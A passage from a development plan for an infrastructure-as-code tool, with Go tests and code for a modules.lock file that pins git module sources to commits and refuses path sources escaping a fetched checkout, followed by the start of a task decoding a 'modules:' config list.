	lf, ds := LoadLockfile(project)
	if ds.HasErrors() {
		t.Fatalf("LoadLockfile: %+v", ds)
	}
	tampered := Record{Source: src, Ref: commit, Commit: strings.Repeat("b", 40)}
	if ds := lf.Check(tampered, value.Origin{}); !ds.HasErrors() {
		t.Error("a hash pin resolving to a different commit was accepted; that is a tampered cache or an abbreviated hash that moved, and it is exactly what the record is for")
	}
}
```

#### 14.2a Failing test: the write happens once, with the whole set

```go
// TestWriteLockfileWritesTheWholeSetSorted. Amendment 18: the write is one
// call with every resolution the walk produced, never one call per Resolve. A
// lockfile built up entry by entry is readable half-written by anything that
// looks — the shape of the M4 lock-file bug (ae1e309), fixed once in
// internal/state/lock.go and not to be reintroduced in a new artifact.
func TestWriteLockfileWritesTheWholeSetSorted(t *testing.T) {
	project := t.TempDir()
	recs := []Record{
		{Source: "https://example.invalid/z", Ref: "v1", Commit: strings.Repeat("c", 40)},
		{Source: "https://example.invalid/a", Ref: "v2", Commit: strings.Repeat("b", 40)},
		{Source: "https://example.invalid/a", Ref: "v1", Commit: strings.Repeat("a", 40)},
	}
	if ds := WriteLockfile(project, recs); ds.HasErrors() {
		t.Fatalf("WriteLockfile: %+v", ds)
	}

	lf := readLockfile(t, project)
	if lf.Version != 1 {
		t.Errorf("version = %d, want 1: the wire format must be able to change without breaking a consumer", lf.Version)
	}
	want := []Record{
		{Source: "https://example.invalid/a", Ref: "v1", Commit: strings.Repeat("a", 40)},
		{Source: "https://example.invalid/a", Ref: "v2", Commit: strings.Repeat("b", 40)},
		{Source: "https://example.invalid/z", Ref: "v1", Commit: strings.Repeat("c", 40)},
	}
	if len(lf.Modules) != len(want) {
		t.Fatalf("modules = %+v, want %+v", lf.Modules, want)
	}
	for i := range want {
		if lf.Modules[i] != want[i] {
			t.Errorf("entry %d = %+v, want %+v — this file is committed, and a diff that reorders itself between runs is a diff nobody can read", i, lf.Modules[i], want[i])
		}
	}

	info, err := os.Stat(filepath.Join(project, "modules.lock"))
	if err != nil {
		t.Fatalf("Stat: %v", err)
	}
	if perm := info.Mode().Perm(); perm != 0o644 {
		t.Errorf("mode = %v, want 0644: this file is committed and read by everyone who checks the project out, unlike a plan artifact or a report", perm)
	}
}

// TestWriteLockfileWritesNothingForAProjectWithNoRemotes matches the
// integration assertion Author C already makes: a lock file listing nothing
// suggests pinning is happening.
func TestWriteLockfileWritesNothingForAProjectWithNoRemotes(t *testing.T) {
	project := t.TempDir()
	if ds := WriteLockfile(project, nil); ds.HasErrors() {
		t.Fatalf("WriteLockfile: %+v", ds)
	}
	if _, err := os.Stat(filepath.Join(project, "modules.lock")); !os.IsNotExist(err) {
		t.Errorf("modules.lock exists for a project that resolved no remote sources (stat err = %v)", err)
	}
}

// TestPinSkipsAPathSource keeps "what belongs in the lockfile" in this package.
// A directory has no commit, and an entry recording one would record something
// nothing can check.
func TestPinSkipsAPathSource(t *testing.T) {
	if _, ok := Pin(Source{Kind: KindPath, Location: "./modules/app"}, Resolution{Dir: "/tmp/x"}); ok {
		t.Error("Pin produced a lockfile entry for a path source")
	}
	rec, ok := Pin(Source{Kind: KindGit, Location: "https://example.invalid/r", Ref: "v1"}, Resolution{Dir: "/tmp/x", Commit: strings.Repeat("a", 40)})
	if !ok {
		t.Fatal("Pin refused a git source")
	}
	if rec.Source != "https://example.invalid/r" || rec.Ref != "v1" {
		t.Errorf("Pin = %+v", rec)
	}
}
```

#### 14.3 Failing test: a fetched module may not reach outside its own checkout

```go
// TestResolveRefusesAPathSourceThatEscapesAFetchedCheckout — add to
// cache_test.go.
//
// A module fetched from git may declare its own relative sources, and they
// resolve against its checkout. "../other" then walks out of the checkout and
// into the cache directory itself, where the neighbours are other refs of other
// repositories — a module reading a sibling it never declared. A path source
// inside a local module tree has no such boundary and is unaffected.
func TestResolveRefusesAPathSourceThatEscapesAFetchedCheckout(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)
	project := t.TempDir()
	c := c13(t, project)

	fetched, ds := c.Resolve(gitSource(repo.Path, "v1.0.0"), project)
	if ds.HasErrors() {
		t.Fatalf("Resolve: %+v", ds)
	}

	if _, ds := c.Resolve(Source{Kind: KindPath, Location: "../.."}, fetched.Dir); !ds.HasErrors() {
		t.Error("a path source inside a fetched module reached outside its checkout")
	}
	// A path INSIDE the checkout is fine, and must stay fine.
	if err := os.MkdirAll(filepath.Join(fetched.Dir, "sub"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if _, ds := c.Resolve(Source{Kind: KindPath, Location: "./sub"}, fetched.Dir); ds.HasErrors() {
		t.Errorf("a path source inside the checkout was refused: %+v", ds)
	}
}

// TestResolveWritesNoLockfile is Amendment 18 asserted from the other side.
// Resolve fetches; it does not record. Everything in this test is a real
// resolve against a real repository, and the project directory must come back
// holding only the cache.
func TestResolveWritesNoLockfile(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)
	project := t.TempDir()

	if _, ds := c13(t, project).Resolve(gitSource(repo.Path, "v1.0.0"), project); ds.HasErrors() {
		t.Fatalf("Resolve: %+v", ds)
	}
	if _, err := os.Stat(filepath.Join(project, "modules.lock")); !os.IsNotExist(err) {
		t.Errorf("Resolve wrote modules.lock (stat err = %v); only stage 5 sees every resolution, and a file written one entry at a time is readable half-written", err)
	}
}
```

#### 14.4 Run them, see them fail

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./internal/modules/source/
```

Expect `undefined: Lockfile`, `undefined: LoadLockfile`, `undefined: WriteLockfile`,
`undefined: Pin`. Two of these fail by NOT failing once they compile —
`TestResolveWritesNoLockfile` passes trivially today, because nothing writes a lockfile
yet, and the containment test passes wrongly because there is no containment rule. Run
both in isolation and read the output rather than the summary; the first is a regression
guard that is correct to be green from the start, and the second is not.

#### 14.5 Minimal code

Create `internal/modules/source/lockfile.go`:

```go
package source

import (
	"encoding/json"
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"strconv"

	"github.com/infrata/infrata/internal/diag"
	"github.com/infrata/infrata/pkg/value"
)

// lockfileName sits beside infra.yml and IS committed — unlike .infra/, which
// is derived data. It records what each remote source resolved to, so that a
// tag moving underneath a project is a reported change rather than a plan that
// quietly differs from yesterday's.
const lockfileName = "modules.lock"

// Record is one entry of modules.lock.
type Record struct {
	Source string `json:"source"`
	Ref    string `json:"ref"`
	Commit string `json:"commit"`
}

// Lockfile is the file's shape. Version exists so the format can change without
// breaking a consumer; it is never omitted.
type Lockfile struct {
	Version int      `json:"version"`
	Modules []Record `json:"modules"`

	// byKey indexes Modules for Check. Unexported so that a Lockfile
	// decoded straight from JSON by a test still works through Check,
	// which rebuilds it lazily.
	byKey map[string]Record
}

// Pin is the lockfile entry a resolution produces, and reports whether there is
// one. A path source has no commit: a directory is not a version, and an entry
// recording one would record something nothing can check.
//
// Every git source gets one, hash pins included. A commit cannot move, so that
// entry can never fire by itself — but excluding it would leave a tampered
// cache, or an abbreviated hash that resolved to something else, unreported,
// and would make the comparison untestable without a live remote.
func Pin(s Source, res Resolution) (Record, bool) {
	if s.Kind != KindGit || res.Commit == "" {
		return Record{}, false
	}
	return Record{Source: s.Location, Ref: s.Ref, Commit: res.Commit}, true
}

// LoadLockfile reads modules.lock. A missing file is not an error: the first
// run of a project that uses a remote module creates it.
func LoadLockfile(projectDir string) (Lockfile, diag.Diagnostics) {
	path := filepath.Join(projectDir, lockfileName)

	data, err := os.ReadFile(path)
	if errors.Is(err, fs.ErrNotExist) {
		return Lockfile{Version: 1}, nil
	}
	if err != nil {
		return Lockfile{}, one(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  lockfileName + " cannot be read",
			Detail:   err.Error(),
			Action:   "Check the permissions on " + path + ".",
		})
	}

	var lf Lockfile
	if err := json.Unmarshal(data, &lf); err != nil || lf.Version != 1 {
		return Lockfile{}, one(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  lockfileName + " is not readable as version 1",
			Detail: "It records what each remote module source resolved to. Rather than guess at a file this " +
				"version does not understand — and then compare against something whose meaning is unknown — " +
				"planning stops here.",
			Action: "Delete " + path + " and re-run to record the current commits, then commit the result.",
		})
	}
	return lf, nil
}

// Check compares one resolution against what the lockfile records. It is a PURE
// READ: it writes nothing, ever.
//
// That is what lets `infra validate` report a moved tag without mutating the
// project it is answering a question about. It is also the third of Amendment
// 18's semantics: an entry that differs is an ERROR and is never adopted. A
// lockfile that silently updates itself to whatever it finds records history
// and enforces nothing — the appearance of pinning without the property, inside
// the feature built to prevent that.
//
// An entry that is absent is not a mismatch. It is a source this project has
// not pinned yet, and WriteLockfile records it after a successful walk.
//
// The key is (Source, Ref), not Source (Amendment 20c). Keyed on the source
// alone, a user editing ":v1.0" to ":v2.0" resolves to a commit that differs
// from the record and is told their own deliberate edit is a moved tag. Under
// this key that edit is simply a pin nobody has recorded yet, and the old
// entry disappears because the next successful walk writes the complete set
// without it.
//
// There is no "the source is recorded under a different ref" branch below, and
// there must not be: that is the same mistake spelled a second way. A changed
// ref is a changed pin, and a changed pin is not a conflict to report — it is
// the user telling this project what they now want.
func (lf *Lockfile) Check(rec Record, origin value.Origin) diag.Diagnostics {
	if lf.byKey == nil {
		lf.byKey = make(map[string]Record, len(lf.Modules))
		for _, r := range lf.Modules {
			lf.byKey[r.Source+"\x00"+r.Ref] = r
		}
	}

	prev, ok := lf.byKey[rec.Source+"\x00"+rec.Ref]
	if !ok || prev.Commit == rec.Commit {
		return nil
	}
	return one(diag.Diagnostic{
		Severity: diag.SeverityError,
		Summary:  "module source " + strconv.Quote(rec.Source+":"+rec.Ref) + " no longer resolves to the recorded commit",
		Detail: lockfileName + " records " + prev.Commit + " for " + strconv.Quote(rec.Ref) +
			", and it now resolves to " + rec.Commit + ". A tag can be moved, so this is a change to what this " +
			"project builds even though nothing in the configuration changed.",
		Action: "If the move is intended, delete that entry from " + lockfileName +
			" (or the whole file) and re-run to record " + rec.Commit + ". If it is not, pin the source to the " +
			"commit instead: " + rec.Source + ":" + prev.Commit + ".",
		Origin: origin,
	})
}

// WriteLockfile persists every resolution a walk produced, in ONE call.
//
// One call, not one per resolution: a file built up entry by entry is readable
// half-written by anything that looks, and if the walk then fails on a cycle or
// a refused source it records half a resolution as though it were complete.
// That is the shape of the M4 lock-file bug (ae1e309), fixed once in
// internal/state/lock.go, and it must not reappear in a new artifact.
//
// The caller decides WHEN: after a successful walk, from a mutating command.
// `infra validate` never calls this — Check is the whole of what it needs.
//
// Because the set is complete, writing it IS the prune: a source the
// configuration no longer names is simply absent from what is written.
func WriteLockfile(projectDir string, records []Record) diag.Diagnostics {
	if len(records) == 0 {
		// Nothing to pin. An existing file is left alone rather than
		// deleted: it is the user's, and it is committed.
		return nil
	}

	dedup := make(map[string]Record, len(records))
	for _, r := range records {
		dedup[r.Source+"\x00"+r.Ref] = r
	}
	lf := Lockfile{Version: 1, Modules: make([]Record, 0, len(dedup))}
	for _, r := range dedup {
		lf.Modules = append(lf.Modules, r)
	}
	// Sorted once, where it is produced: this file is committed, and a diff
	// that reorders itself between runs is a diff nobody can read.
	sort.Slice(lf.Modules, func(i, j int) bool {
		if lf.Modules[i].Source != lf.Modules[j].Source {
			return lf.Modules[i].Source < lf.Modules[j].Source
		}
		return lf.Modules[i].Ref < lf.Modules[j].Ref
	})

	data, err := json.MarshalIndent(lf, "", "  ")
	if err != nil {
		return one(lockfileWriteDiag(projectDir, err))
	}

	return writeFileAtomically(filepath.Join(projectDir, lockfileName), append(data, '\n'), 0o644, projectDir)
}

// writeFileAtomically writes a temp file in the same directory and renames it
// over the target.
//
// os.Rename, NOT the os.Link that the cache's fetch lock uses (13.6), and the
// difference is the requirement rather than a preference. Rename OVERWRITES,
// which is exactly the job here: replacing the lockfile with the new one is
// what writing it means, and internal/state/local.go's Put does the same for
// the same reason. Link fails if the target exists, which is what makes it
// right for a lock that must be held by one process and wrong for a file that
// is rewritten on every successful run.
//
// This project has had that call wrong in each direction once. Getting it
// backwards here would mean a second run of any project with a remote module
// fails to write its lockfile and reports a lock conflict that does not exist.
func writeFileAtomically(path string, data []byte, perm os.FileMode, dir string) diag.Diagnostics {
	tmp, err := os.CreateTemp(dir, "."+filepath.Base(path)+"-*.tmp")
	if err != nil {
		return one(lockfileWriteDiag(dir, err))
	}
	name := tmp.Name()
	defer os.Remove(name) // a no-op once the rename has succeeded

	// 0644, not the 0600 a plan artifact or a report gets: this file is
	// committed and read by everyone who checks the project out, and it
	// holds no secrets — Parse refuses a source carrying credentials.
	if err := tmp.Chmod(perm); err == nil {
		_, err = tmp.Write(data)
	}
	if err != nil {
		tmp.Close()
		return one(lockfileWriteDiag(dir, err))
	}
	if err := tmp.Close(); err != nil {
		return one(lockfileWriteDiag(dir, err))
	}
	if err := os.Rename(name, path); err != nil {
		return one(lockfileWriteDiag(dir, err))
	}
	return nil
}

func lockfileWriteDiag(dir string, err error) diag.Diagnostic {
	return diag.Diagnostic{
		Severity: diag.SeverityError,
		Summary:  lockfileName + " could not be written",
		Detail:   err.Error(),
		Action:   "Check the permissions on " + dir + ".",
	}
}
```

**Nothing is added to `Cache`.** `Resolve` stays exactly as Task 13 left it: it returns a
`Resolution` and writes nothing. If you find yourself giving `Cache` a `recorded` field or
a `WriteLockfile` method, that is Amendment 18 being undone — stage 5 is the only
component that sees every resolution, including the nested ones that are unknowable until
the module declaring them has been loaded.

And `resolvePath` gains the containment rule:

```go
	// A module fetched from git may declare its own relative sources, and
	// they resolve against its checkout. "../.." from there walks into the
	// cache root, where the neighbours are other refs of other repositories.
	// A module may reach anywhere inside its own checkout and nowhere above
	// it. A path source declared in the project's own tree has no such
	// boundary: "../shared/modules/net" is a legitimate thing to write.
	if root, ok := c.checkoutRootOf(baseDir); ok {
		rel, err := filepath.Rel(root, dir)
		if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
			return Resolution{}, one(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "module source " + strconv.Quote(s.Location) + " reaches outside its own repository",
				Detail: "It was declared inside a module fetched from a git remote, and a relative source there is " +
					"resolved against the checkout. " + strconv.Quote(s.Location) + " resolves above it, into the module cache itself.",
				Action: "Use a path inside the repository, or declare the other module as its own pinned source.",
				Origin: s.Origin,
			})
		}
	}
```

`checkoutRootOf` reports whether a directory is inside a fetched checkout and returns that
checkout's root: `<cache root>/<16 hex>/<slug>`. Implement it by `filepath.Rel(c.root(),
dir)` and taking the first two segments; return `ok == false` when `rel` escapes.

#### 14.5a Follow-up to file, not to build

`--upgrade` does not exist, and the moved-tag Action therefore tells the user to delete
the entry and re-run. That is crude but honest, it needs no new surface, and it is tested
(`TestTheDocumentedRemedyWorks`). Record the real fix as a follow-up rather than building
it here:

> `infra plan --upgrade` (or `infra modules update <name>`) to re-record a moved pin
> without hand-editing `modules.lock`. Until it exists, the moved-tag diagnostic's Action
> names a file edit, and `TestCheckReportsAMovedTagAndNeverAdoptsIt` asserts the Action
> does NOT name a flag this build does not have — so whoever adds the flag will find that
> assertion and update the message with it.

That last clause is the point: the follow-up is wired to a test that fails if someone adds
the flag and forgets the message.
#### 14.6 Run everything

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./...
go test -count=1 -race ./internal/modules/source/
go vet ./... && gofmt -l .
go list -deps ./internal/modules/source/ | grep infrata   # must NOT list internal/config
git diff --stat go.mod go.sum          # must print nothing
grep -rn "yaml\." --include=*.go internal/ pkg/ cmd/ | grep -v "^internal/config/"   # must print nothing
grep -rn "<sensitive>" --include=*.go internal/ pkg/ | grep -v _test.go              # must name only pkg/value/format.go
```

#### 14.7 Sabotage

| Sabotage | Must fail |
|----------|-----------|
| In `Check`, return `nil` instead of the diagnostic when the commits differ | `TestCheckReportsAMovedTagAndNeverAdoptsIt` |
| In `Check`, key on `rec.Source` alone | `TestBumpingAPinIsANewEntryNotAMismatch`. One line, the natural-reading mistake, and nothing else in the suite catches it |
| Keep the `(source, ref)` key but add a branch reporting a conflict when the source is recorded under ANOTHER ref | the same test. **This is the same defect reached by a different edit, not a second one** — it is the shape Amendment 18c shipped, and it is listed separately because a reviewer who has ruled out the key change will not think to look for it. Two spellings, one bug, one test: do not read them as two independent guards |
| In `Pin`, skip sources where `s.PinnedToHash()` | `TestAHashPinnedSourceIsRecordedAndChecked` |
| In `Check`, UPDATE the entry instead of reporting — the "helpful" version | the same test, on its second assertion: the file is no longer byte-identical. Run this one; it is the twentieth instance of this project's most-catalogued defect, written out as a two-line change |
| Have `Check` record an absent entry | `TestCheckIsAPureRead`, and with it `infra validate` silently becoming a writer |
| In `WriteLockfile`, write `Version: 0` | `TestWriteLockfileWritesTheWholeSetSorted` |
| Replace `os.Rename` with `os.Link` in `writeFileAtomically` | `TestWriteLockfileWritesTheWholeSetSorted` on the second run of any project — and note the failure mode it produces, a phantom lock conflict, because this project has had that call wrong in each direction once |
| Drop the sort in `WriteLockfile` | `TestWriteLockfileWritesTheWholeSetSorted` (the map iteration order does the rest) |
| Drop the containment check in `resolvePath` | `TestResolveRefusesAPathSourceThatEscapesAFetchedCheckout` |

#### 14.8 Commit

One commit: everything here is inside this package.

```bash
git add internal/modules/source/lockfile.go internal/modules/source/lockfile_test.go
git commit -m "Record what each remote module source resolved to in modules.lock

A tag is mutable, so pinning to one without recording the commit gives the
appearance of determinism without the property. modules.lock sits beside
infra.yml and is meant to be committed, where .infra/ is derived data and is
not.

Per Amendment 18 this package owns the format, the comparison and the write, and
not the decision of when: Check is a pure read, so `infra validate` reports a
moved tag without mutating the project it is answering about, and WriteLockfile
takes a complete set in one call, because a file built up one entry per resolve
is readable half-written and records half a walk as though it were whole. An
entry that differs is an error and is never adopted.

The write is os.Rename, matching internal/state/local.go's Put and NOT the
os.Link the fetch lock uses: overwriting is the job here, where exclusivity is
the job there.

Also refuses a relative path source inside a fetched checkout from resolving
above that checkout, where the neighbours are other refs of other repositories.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>" -- internal/modules/source/lockfile.go internal/modules/source/lockfile_test.go internal/modules/source/cache.go internal/modules/source/cache_test.go

```

---

---

## Task 2 — stage 2 decodes the `modules:` LIST, and the `module.<name>` type

**Land this after Task 1 AND after Author D's Tasks 11-14.** It does not consume Task 1's
types — that ordering is so review sees one change at a time — but contract Amendment 13d
makes it consume `internal/modules/source.Parse`, so **`internal/modules/source` must exist
before this task can compile**. If it does not, stop and say so; do not write a local
substitute for it, because a second implementation of "where does the `:ref` end and the
location begin" is precisely what 13d exists to prevent.

Verified by the lead: no import cycle. `internal/modules/source` needs only `internal/diag`,
`pkg/value` and `pkg/address`, none of which import `internal/config`.

**Shapes are fixed by contract Amendment 8** and `PLAN.md` §11.1/§11.2. Loading a module
and instantiating it are SEPARATE steps: `modules:` makes a module available under a name
and carries no inputs; a resource of type `module.<name>` instantiates it. There is no
`ModuleDecl` and no `ModuleInputDecl` — if you find either name in a draft, that draft
predates Amendment 8.

### Why this task exists

`modules:` in `infra.yml` is today an **unrecognised top-level key with a WARNING**
(`internal/config/decode.go`, `decodeDocument`'s default arm). A user who writes `PLAN.md`
§11.1's example gets a warning they can easily miss and a plan containing none of the
infrastructure they declared. Nothing says the modules were ignored; the plan simply
proposes fewer resources than the configuration describes.

Three things here are silent-wrong-value hazards rather than shape-checking:

1. **A derived-name collision must not be resolved by order.** Two entries whose sources
   derive the same name — `acme/infra-app-stack:v1.2.0` and `other/infra-app-stack:v2.0.0`
   — both derive `infra_app_stack`. "Last one wins" would silently instantiate the wrong
   module, and would make the `name:` form pointless, since the whole reason it exists is
   to disambiguate exactly this. It is an ERROR naming both entries.

2. **`modules:` is a LIST where every sibling block is a mapping.** That asymmetry is
   deliberate and must not be smoothed over: a mapping's key would BE the name, and the
   name has to be optional and derived from the source. A user who writes the mapping form
   gets a diagnostic that says so, because the obvious reading of a `modules:` mapping
   error is "I mistyped something", not "this block has a different shape on purpose".

3. **A malformed `module.` type would be selected by stage 5 anyway.** Stage 5 picks
   instances with `strings.HasPrefix(r.Type, "module.")` (Amendment 8c), so `type: module.`
   and `type: module.a.b` are both selected and then looked up as a module named `""` or
   `"a.b"`. Stage 2 is where the line number is and where the spelling is a property of the
   text, so the two guards live here.

4. **A resource NAME containing a dot silently collides with a module address**
   (contract Amendment 16a). `decodeResources` takes `nameNode.Value` verbatim, and
   `Address.String()` returns `Name` verbatim when `Module` is empty, so this validates
   clean today — `✓ Configuration valid`, exit 0 — and writes the state key
   `module.prod.database`:

   ```yaml
   resources:
     module.prod.database:
       type: test.network
   ```

   That is byte for byte what the resource `database` inside module instance `prod` will
   write once M5 lands. **This is why it is M5's and not the follow-up list's:** a state
   file written today with such a name is unambiguous today and becomes ambiguous the
   moment the first module ships. M5 is the last milestone in which closing it costs a
   diagnostic rather than a migration.

   **14a and 16a are the same collision through different doors, and neither is redundant.**
   14a (Task 1) guards the REFERENCE grammar in `parseReference`, so `${module.prod.db.id}`
   cannot be written. 16a guards the DECLARATION here, so the same string cannot become an
   address in the first place. A reference is parsed out of an expression; a name is read
   from a mapping key. Neither code path can reach the other, so deleting either as
   duplicated reopens half the collision.

**How the source is handled, per contract Amendment 13d.** Stage 2 calls
`source.Parse(raw, origin)` and does two things with the result: it emits its diagnostics,
and it derives the module's name from `Source.Location`. It does NOT split the raw text
itself — one implementation of "where does the `:ref` end and the location begin", and it is
D's.

`Parse` is pure — text in, no disk, no network — so stage 2 keeps its rule that it touches
neither. What moves to stage 2 is only the REPORTING: `Parse` takes an `origin` precisely
because its diagnostics are meant to point at a line, and stage 2 is the only stage that has
one. So a missing `:tag-or-hash` pin, a refused scheme and `ext::` are all reported by
`infra validate` at the line the source was written on, before anything is fetched.

Fetching is still stage 5's: `Cache.Resolve(s source.Source, baseDir string)` takes an
already-parsed `Source`, so stage 5 re-parses the validated string to obtain one. That
re-parse is free and cannot fail differently, since stage 2 refused every source `Parse`
rejects. **Stage 5 must not re-emit `Parse`'s diagnostics** or a bad source is reported
twice.

> **Seam noted for the lead, not decided here.** `Cache.Resolve` taking a `source.Source`
> is a hint that the parsed value is meant to flow rather than be re-derived, which would
> argue for `ModuleLoadDecl` carrying a `source.Source` instead of a `string`. Amendment 8a
> fixes that field as `Source string`, so this task does not change it. If the re-parse is
> unwanted, that is the change to make, and it is one field.

### Files

| Action | Path |
|--------|------|
| create | `internal/config/decode_modules.go` |
| create | `internal/config/decode_modules_test.go` |
| modify | `internal/config/declarations.go` — `ModuleLoadDecl`, `ProjectDecl.Modules` |
| modify | `internal/config/decode.go` — the `modules` case, `seenModules`, the sort, and in `decodeResources` a name check plus four lines in its `case "type":` |

### Interfaces

**Consumes (from HEAD):**

```go
// internal/config — existing unexported helpers, REUSED, not reimplemented
func requireScalar(path, what string, node *yaml.Node, ds *diag.Diagnostics) (string, bool)
func originOf(path string, n *yaml.Node) value.Origin
func describeOrigin(o value.Origin) string

// internal/config — existing types
type ResourceDecl struct { Name, Type string; Attributes map[string]AttributeDecl; DependsOn []string; Lifecycle LifecycleDecl; Origin value.Origin }
type ProjectDecl struct { Project string; Resources []*ResourceDecl; Variables []VariableDecl; Environments []EnvironmentDecl; VariableValues map[string]value.Value; Origin value.Origin }
func Decode(files []File) (*ProjectDecl, diag.Diagnostics)
```

**Produces — contract Amendment 8a. Tasks 4-7 consume these exactly:**

```go
// internal/config

// ModuleLoadDecl is one entry in `modules:`.
type ModuleLoadDecl struct {
    Name         string
    Source source.Source   // PARSED, not text — Amendment 15b amends 8a
    Origin value.Origin
}

// ProjectDecl gains, and only this:
//   Modules []ModuleLoadDecl   // sorted by Name

// unexported, used by this task and REUSED by Task 3:
func decodeModuleLoads(path string, node *yaml.Node, dst *[]ModuleLoadDecl, ds *diag.Diagnostics, seen map[string]loadedName)
func identifierSegment(s string) bool
```

**Consumed from Author D (contract Amendments 10 and 20a), Tasks 11-14:**

```go
// internal/modules/source
type Kind int // KindPath, KindGit
type Source struct { Kind Kind; Location, Ref string; Origin value.Origin }
func Parse(raw string, origin value.Origin) (Source, diag.Diagnostics)
func DeriveName(s Source) (string, diag.Diagnostics)
```

**Name derivation is `source.DeriveName`'s, not this task's** (contract Amendment 20a). An
earlier draft of Task 2 carried its own `deriveModuleName`; it was a full duplicate of D's,
and the two would have had to agree forever with nothing able to catch them drifting — each
tested against its own table, both green. Derivation and parsing split the same text at the
same two boundaries, and D's version already shares `Parse`'s `splitScheme`/`splitSCP`
helpers, so there is one answer computed in one place.

**Do not reintroduce a local derivation helper.** If `DeriveName` gives a wrong answer, fix
it there.

**A caller's inputs are ordinary attributes.** An instantiation is a `ResourceDecl`, so
`type: module.app_stack` with `replicas: 3` beneath it produces
`ResourceDecl.Attributes["replicas"]` through the code path that already exists. Stage 6
binds it with `bindAttribute`, which means it carries whatever provenance its source gave
it with no new rung logic — a literal lands on `ScopeBaseConfig` because it was written in
the caller's file, and a `${count}` fed from `--var` keeps `ScopeCLIOverride` because
`Evaluate` returns the variable's own `Value`. **This is why contract Amendments 5a and 5b
are void**: they existed to hand-write, for modules only, a rung the compiler already gets
right for everything else.

`ResourceDecl.DependsOn` likewise already exists and already refuses a scalar, so a module
call inherits that behaviour rather than this task rewriting it.

### Steps

#### 2.1 — Write the failing tests

Create `internal/config/decode_modules_test.go`:

```go
package config

import (
	"strconv"
	"strings"
	"testing"
)

// TestDecodeModulesList is the happy path over PLAN.md §11.1's own example.
//
// The entries are written "zeta" before "alpha" on purpose. A fixture already in
// sorted order passes against code that does no sorting at all — and it looks
// tidier, which is exactly why it gets written by mistake.
func TestDecodeModulesList(t *testing.T) {
	files := writeConfig(t, `
project: myapp

modules:
  - ./modules/zeta
  - ./modules/alpha
  - https://github.com/acme/infra-app-stack:v1.2.0
  - name: app_stack_v2
    source: https://github.com/other/infra-app-stack:v2.0.0
`)
	got, ds := Decode(files)
	requireNoErrors(t, ds)

	if len(got.Modules) != 4 {
		t.Fatalf("decoded %d modules, want 4", len(got.Modules))
	}
	names := make([]string, len(got.Modules))
	for i, m := range got.Modules {
		names[i] = m.Name
	}
	want := []string{"alpha", "app_stack_v2", "infra_app_stack", "zeta"}
	for i := range want {
		if names[i] != want[i] {
			t.Fatalf("modules are not sorted by name: got %v, want %v", names, want)
		}
	}

	byName := map[string]ModuleLoadDecl{}
	for _, m := range got.Modules {
		byName[m.Name] = m
	}
	if byName["alpha"].Source.Location != "./modules/alpha" {
		t.Errorf("alpha location = %q", byName["alpha"].Source.Location)
	}
	// The pin is kept SEPARATELY from the location. A parsed source whose Ref
	// were folded back into Location would send stage 5's cache the tag as part
	// of the path, and .infra/modules keys on the two independently.
	stack := byName["infra_app_stack"]
	if stack.Source.Location != "https://github.com/acme/infra-app-stack" || stack.Source.Ref != "v1.2.0" {
		t.Errorf("derived-name entry parsed to %+v, want location without the pin and Ref \"v1.2.0\"", stack.Source)
	}
	if byName["app_stack_v2"].Source.Ref != "v2.0.0" {
		t.Errorf("named entry ref = %q", byName["app_stack_v2"].Source.Ref)
	}
	for _, m := range got.Modules {
		// ModuleLoadDecl has no SourceOrigin: source.Source carries its own,
		// stamped from the origin stage 2 passed to Parse. If this fails,
		// Parse is not stamping it and the field cannot be dropped — say so
		// rather than adding a second copy back.
		if m.Source.Origin.Line == 0 {
			t.Errorf("module %q: source.Source.Origin has no line; stage 5's fetch diagnostics point at it", m.Name)
		}
		if m.Origin.Line == 0 {
			t.Errorf("module %q has no Origin line", m.Name)
		}
	}

	// Loading is not instantiating. A `modules:` entry must not appear as a
	// resource, or the plan would propose a resource with no type.
	if len(got.Resources) != 0 {
		t.Errorf("decoded %d resources from a file with none", len(got.Resources))
	}
}

// TestUndeivableNameIsStage2sHalfOfTheDerivationRule.
//
// The derivation rule itself, and its table, belong to source.DeriveName
// (contract Amendment 20a) — this task must not re-test it, because a second
// table is how two implementations of one rule stay green while drifting apart.
//
// What IS stage 2's is the plumbing: that DeriveName's refusal reaches the user
// as a diagnostic naming the `name:` form, and that the entry is DROPPED. The
// second assertion is the load-bearing one. A refusal test that checks only the
// message passes against code that prints the message and keeps the entry
// anyway, leaving a module with an empty or mangled name in ProjectDecl for
// anything downstream that does not check errors first.
//
// The fixture has to REACH derivation. A source that source.Parse rejects never
// gets there — parseSource returns early so Parse's own diagnostic is not
// followed by a second one about the same entry — so this uses a path, which
// Parse accepts, whose last segment is not an identifier.
func TestUndeivableNameIsStage2sHalfOfTheDerivationRule(t *testing.T) {
	files := writeConfig(t, `
project: myapp

modules:
  - ./modules/my.module
`)
	got, ds := Decode(files)
	requireErrorAbout(t, ds, "name:")
	if len(got.Modules) != 0 {
		t.Errorf("an entry whose name could not be derived was still decoded: %+v", got.Modules[0])
	}
}

// TestModulesMustBeAList pins the shape asymmetry, and the diagnostic has to
// EXPLAIN it.
//
// `resources:`, `variables:` and `environments:` are all mappings, so the
// obvious reading of a `modules:` mapping error is "I mistyped something". The
// detail says why this one is a list: a mapping's key would be the name, and the
// name is optional. The fixture is also the shape every pre-Amendment-8 draft
// and every other IaC tool uses, so it is the mistake a real user makes.
func TestModulesMustBeAList(t *testing.T) {
	files := writeConfig(t, `
project: myapp

modules:
  networking:
    source: ./modules/networking
`)
	_, ds := Decode(files)
	d := requireErrorAbout(t, ds, "`modules` must be a list of module sources")
	if !strings.Contains(d.Detail, "derived") {
		t.Errorf("detail does not say why `modules` is a list rather than a mapping: %s", d.Detail)
	}
	if !strings.Contains(d.Action, "- ./modules/") {
		t.Errorf("action does not show the list spelling: %s", d.Action)
	}
}

// TestTwoEntriesDerivingTheSameNameIsAnError is the collision rule, and the
// assertions are what stop it being resolved by order.
//
